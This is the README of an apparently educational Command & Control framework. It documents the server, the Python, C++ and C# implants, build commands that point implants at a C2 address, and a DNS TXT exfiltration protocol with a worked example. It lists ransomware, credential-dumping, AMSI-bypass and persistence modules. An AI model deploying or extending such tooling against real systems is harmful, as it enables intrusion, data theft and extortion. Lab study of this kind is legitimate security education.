# C2 Framework - Educational Red Team Lab

> **DISCLAIMER:** This project is for **authorized security testing, educational purposes, and lab environments only**. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical.

## Overview

A full-stack Command & Control (C2) framework built for learning offensive security concepts. It features a FastAPI backend, React frontend, PostgreSQL database, and multi-platform implants (Python, C++, C#) with HTTP and DNS communication channels.

## Architecture

```
┌─────────────────────────────────────────────────────┐
│                   C2 Server                         │
│  ┌──────────┐  ┌──────────┐  ┌──────────────────┐   │
│  │ React UI │  │ FastAPI  │  │   PostgreSQL     │   │
│  │ :3000    │→ │ :8000    │→ │   :5432          │   │
│  └──────────┘  └────┬─────┘  └──────────────────┘   │
│                     │                               │
│         ┌───────────┼───────────┐                   │
│         │ HTTP      │ DNS       │                   │
│         │ Polling   │ TXT       │                   │
└─────────┼───────────┼───────────┼───────────────────┘
          │           │           │
    ┌─────┴─────┐  ┌──┴────┐  ┌───┴───┐
    │  Implant  │  │Implant│  │Implant│
    │  (Python) │  │ (C++) │  │ (C#)  │
    │  Win/Lin  │  │ Linux │  │  Win  │
    └───────────┘  └───────┘  └───────┘
```

## Project Structure

```
C2/
├── C2 Server/
│   ├── backend/
│   │   ├── main.py                    # Entry point - starts HTTP/DNS servers
│   │   ├── requirements.txt           # Python dependencies
│   │   ├── models/
│   │   │   ├── user.py                # Operator accounts
│   │   │   ├── target.py              # Compromised host records
│   │   │   ├── command.py             # Command queue & results
│   │   │   └── key_store.py           # RSA keypairs for crypto module
│   │   └── classes/
│   │       ├── database.py            # SQLModel/PostgreSQL engine
│   │       ├── auth.py                # JWT + bcrypt authentication
│   │       ├── command_processor.py   # Command generation pipeline
│   │       ├── routes/
│   │       │   ├── auth_routes.py     # POST /auth/login
│   │       │   ├── target_routes.py   # Target CRUD + beacon config
│   │       │   ├── command_routes.py  # Command dispatch (raw + module)
│   │       │   ├── agent_routes.py    # Unauthenticated implant APIs
│   │       │   └── dropper_routes.py  # Payload generation & download
│   │       ├── servers/
│   │       │   ├── http_server.py     # HTTP C2 listener
│   │       │   └── dns_server.py      # DNS TXT C2 listener
│   │       ├── modules/
│   │       │   ├── base_module.py     # Abstract module interface
│   │       │   ├── crypto_module.py   # RSA+AES file encryption
│   │       │   ├── netscan_module.py  # Port scanning from target
│   │       │   ├── creddump_module.py # Credential harvesting
│   │       │   ├── exfil_module.py    # Data exfiltration (HTTP/DNS)
│   │       │   └── encoder_module.py  # XOR+base64 obfuscation
│   │       └── helpers/
│   │           └── seed.py            # Default admin seeder
│   ├── frontend/
│   │   ├── src/
│   │   │   ├── App.tsx                # Root component + routing
│   │   │   ├── pages/                 # LoginPage, Dashboard, TargetList, etc.
│   │   │   ├── components/            # Navbar, ProtectedRoute
│   │   │   ├── store/                 # Redux slices (auth, targets)
│   │   │   └── services/              # Axios API client
│   │   └── package.json
│   ├── docker-compose.yml             # Full stack deployment
│   └── .env                           # Environment configuration
│
├── C2 Client/
│   ├── client.py                      # Core Python implant (cross-platform)
│   ├── client_windows.py              # Windows-specific features
│   ├── client_linux.py                # Linux-specific features
│   ├── windows/
│   │   ├── Program.cs                 # C# .NET 8 native implant
│   │   └── C2Client.csproj
│   └── linux/
│       ├── main.cpp                   # C++17 native implant
│       └── Makefile
│
├── .aiignore
└── .gitignore
```

## Features

### Server
- **Operator Dashboard** - React UI for managing targets and dispatching commands
- **JWT Authentication** - bcrypt password hashing, 60-min token expiry
- **Multi-Channel C2** - HTTP polling, DNS TXT record exfiltration
- **Payload Modules** - CryptoLocker, Network Scanner, Credential Dump, Exfiltration
- **Obfuscation Engine** - XOR + base64 encoded command wrappers (PowerShell/Bash)
- **Dropper Generator** - Produce Python/C++/C# implants or shell one-liner stagers
- **Dockerized Deployment** - PostgreSQL + FastAPI + React via docker-compose

### Client (Implants)
- **Multi-Platform** - Python (cross-platform), C++ (Linux), C# (Windows)
- **Persistence** - Registry Run keys, Scheduled Tasks, Startup folder, crontab, systemd, bashrc
- **Evasion** - AMSI bypass (Windows), process name masquerading (Linux), sandbox/VM detection
- **Dual Channels** - HTTP beacon polling + DNS TXT record C2
- **Configurable Beaconing** - Adjustable interval + jitter factor

## Quick Start

### Prerequisites
- Docker & Docker Compose
- Python 3.8+ (for client testing)
- .NET 8 SDK (optional, for Windows native build)
- g++ with libcurl (optional, for Linux native build)

### Deploy the Server

```bash
cd "C2 Server"
docker-compose up -d
```

Default access:
- **Dashboard**: http://localhost:3000
- **API**: http://localhost:8000
- **Credentials**: `admin` / `admin123` (change in `.env`)

### Run a Python Implant (lab testing)

```bash
cd "C2 Client"
# Default: connects to 127.0.0.1:8000
python client.py

# Override server address
C2_SERVER=10.0.0.5:8000 python client.py
```

### Build Native Implants

**Linux (C++17):**
```bash
cd "C2 Client/linux"
make                                    # Default: 127.0.0.1:8000
make C2_SERVER=10.0.0.5:8000           # Custom server
```

**Windows (C# .NET 8):**
```bash
cd "C2 Client/windows"
dotnet publish -c Release -r win-x64 --self-contained true           # Default: 127.0.0.1:8000
dotnet publish -c Release -r win-x64 --self-contained true /p:C2Server=10.0.0.5:8000  # Custom server

# Runtime overrides also available:
#   C2Client.exe --server 10.0.0.5:8000
#   C2_SERVER=10.0.0.5:8000 ./C2Client.exe
```

## Environment Variables

### Server (`.env`)
| Variable | Default | Description |
|---|---|---|
| `POSTGRES_USER` | `c2admin` | Database username |
| `POSTGRES_PASSWORD` | `c2password` | Database password |
| `POSTGRES_DB` | `c2db` | Database name |
| `DATABASE_URL` | `postgresql://c2admin:c2password@db:5432/c2db` | Full DB connection string |
| `JWT_SECRET` | `change-me-in-production` | JWT signing key |
| `DEFAULT_ADMIN_USERNAME` | `admin` | Initial operator username |
| `DEFAULT_ADMIN_PASSWORD` | `admin123` | Initial operator password |
| `ENABLE_DNS_SERVER` | `false` | Enable DNS C2 channel |
| `C2_DNS_DOMAIN` | `c2.local` | DNS C2 domain |
| `DNS_PORT` | `15353` | DNS listener port |

### Client
| Variable | Default | Description |
|---|---|---|
| `C2_SERVER` | `127.0.0.1:8000` | Server address |
| `C2_INTERVAL` | `10` | Beacon interval (seconds) |
| `C2_JITTER` | `0.3` | Jitter factor (0-1) |
| `C2_CHANNEL` | `http` | Channel: `http` or `dns` |
| `C2_DNS_DOMAIN` | `c2.local` | DNS exfil domain |
| `C2_DNS_PORT` | `15353` | DNS server port |

## API Reference

### Authentication
| Method | Endpoint | Auth | Description |
|---|---|---|---|
| POST | `/auth/login` | No | Get JWT token |

### Targets
| Method | Endpoint | Auth | Description |
|---|---|---|---|
| GET | `/targets` | JWT | List all targets |
| GET | `/targets/{id}` | JWT | Get target details |
| PATCH | `/targets/{id}/beacon` | JWT | Update beacon config |
| GET | `/targets/{id}/keys` | JWT | Get RSA keys for target |

### Commands
| Method | Endpoint | Auth | Description |
|---|---|---|---|
| POST | `/commands` | JWT | Bulk raw command |
| POST | `/commands/module` | JWT | Bulk module command |
| POST | `/targets/{id}/command` | JWT | Single raw command |
| POST | `/targets/{id}/module` | JWT | Single module command |

### Agent (Implant)
| Method | Endpoint | Auth | Description |
|---|---|---|---|
| POST | `/agent/register` | No | Register implant |
| GET | `/agent/{id}/commands` | No | Poll for commands |
| POST | `/agent/{id}/commands/{cid}/result` | No | Submit results |
| POST | `/agent/{id}/exfil` | No | Exfil data chunk |

### Dropper
| Method | Endpoint | Auth | Description |
|---|---|---|---|
| POST | `/dropper/agent` | JWT | Generate Python agent |
| POST | `/dropper/build` | JWT | Build native binary |
| GET | `/dropper/stager/{os}` | JWT | Get stager one-liner |

## Payload Modules

| Module | Description | Platforms |
|---|---|---|
| `cryptolocker` | RSA-2048 + AES-256-CBC file encryption | Windows (PowerShell), Linux (OpenSSL) |
| `netscan` | TCP port scanner from target network | Windows (PowerShell), Linux (Bash) |
| `creddump` | Credential harvesting (Mimikatz, SAM, shadow, SSH keys) | Windows, Linux |
| `exfil` | Data exfiltration with HTTP/DNS transport + XOR/AES encryption | Windows, Linux |

## Communication Flow

### HTTP Channel

```
1. Implant starts → POST /agent/register (hostname, IP, MAC, OS)
2. Server returns target_id
3. Loop:
   a. Sleep(interval ± jitter)
   b. GET /agent/{id}/commands → receive pending commands
   c. Execute command locally (shell or module payload)
   d. POST /agent/{id}/commands/{cid}/result → send output
```

### DNS Channel (UDP, port 15353 by default)

Uses DNS TXT record queries as the transport layer. Useful when HTTP is blocked but DNS resolution is allowed.

**Poll (implant → server):**
```
Query:    TXT {target_id}.poll.{C2_DNS_DOMAIN}

Response (no pending command):
  base64 → {"sleep": <int>, "jitter": <float>}

Response (pending command):
  base64 → {"id": "<cmd_id>", "command": "<payload>", "sleep": <int>, "jitter": <float>}
```

The implant checks for the presence of `"id"` to decide whether a command was delivered. It always reads `sleep` and `jitter` to compute the next check-in delay: `delay = sleep * uniform(1 - jitter, 1 + jitter)`.

**Result submission (implant → server):**
```
Query:    TXT {b64_chunk}.{chunk_idx}.{total_chunks}.{cmd_id}.res.{C2_DNS_DOMAIN}
Response: TXT "OK"
```

- Command output is base64-encoded, then split into URL-safe, dot-free chunks of up to 50 characters
- `chunk_idx` is 0-based; one DNS query is sent per chunk
- The server reassembles the full output once all chunks arrive

**Example flow:**
```
1. Implant sends:  TXT  abc123.poll.c2.local
2. Server replies: TXT  eyJpZCI6ICIxIiwgImNvbW1hbmQiOiAid2hvYW1pIiwgInNsZWVwIjogMTAsICJqaXR0ZXIiOiAwLjN9
3. Implant decodes → {"id": "1", "command": "whoami", "sleep": 10, "jitter": 0.3}
4. Implant executes "whoami" → "root"
5. Implant encodes output → base64 → "cm9vdA=="
6. Implant sends:  TXT  cm9vdA==.0.1.1.res.c2.local
7. Server replies: TXT  "OK"
```

## Tech Stack

| Component | Technology |
|---|---|
| Backend | Python 3.11, FastAPI, SQLModel, Uvicorn |
| Frontend | React 18, TypeScript, Redux Toolkit, Axios |
| Database | PostgreSQL 16 |
| Deployment | Docker Compose |
| Client (Python) | Python stdlib only (zero dependencies) |
| Client (Linux) | C++17, libcurl, pthreads |
| Client (Windows) | C# .NET 8, self-contained single-file |

## License

This project is intended for **educational and authorized security testing purposes only**. Use responsibly and only in environments you own or have explicit written permission to test.